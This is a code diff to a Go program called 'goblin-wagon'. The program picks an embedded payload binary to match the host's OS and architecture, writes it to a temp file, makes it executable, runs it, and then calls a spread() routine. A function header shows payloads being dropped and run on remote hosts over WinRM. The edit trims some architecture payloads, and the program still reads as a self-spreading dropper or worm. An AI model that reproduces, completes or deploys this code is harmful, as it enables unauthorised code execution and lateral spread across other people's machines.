@@ -289,23 +289,13 @@ func drop_and_run_winrm(client *winrm.Client, data []byte, ip string) error {
 //go:embed binaries/payload_linux_amd64
 var payload_linux_amd64 []byte
 
-//go:embed binaries/payload_linux_386
-var payload_linux_386 []byte
-
 //go:embed binaries/payload_linux_arm64
 var payload_linux_arm64 []byte
 
 //go:embed binaries/payload_windows_amd64.exe
 var payload_windows_amd64 []byte
 
-//go:embed binaries/payload_windows_386.exe
-var payload_windows_386 []byte
-
-//go:embed binaries/payload_windows_arm64.exe
-var payload_windows_arm64 []byte
-
 func main() {
-	
     log.SetFlags(log.Ltime | log.Lshortfile)
     log.Println("[*] goblin-wagon starting")
 
@@ -316,11 +306,8 @@ func main() {
 
     payloads := map[Platform][]byte{
         {OS: "linux",   Arch: "amd64"}: payload_linux_amd64,
-        {OS: "linux",   Arch: "386"}:   payload_linux_386,
         {OS: "linux",   Arch: "arm64"}: payload_linux_arm64,
         {OS: "windows", Arch: "amd64"}: payload_windows_amd64,
-        {OS: "windows", Arch: "386"}:   payload_windows_386,
-        {OS: "windows", Arch: "arm64"}: payload_windows_arm64,
     }
 
     key := Platform{OS: host_os, Arch: arch}
@@ -360,7 +347,7 @@ func main() {
     log.Printf("[*] chmod 0700 applied")
 
     cmd := exec.Command(tmp.Name())
-    cmd.Stdout = os.Stdout  // pipe output so you can see what wagon.go is doing
+    cmd.Stdout = os.Stdout
     cmd.Stderr = os.Stderr
     log.Printf("[*] executing payload: %s", tmp.Name())
 
@@ -378,8 +365,6 @@ func main() {
 
     log.Println("[*] goblin-wagon done")
 
-	spread()
-
-
+    spread()
 }
 	
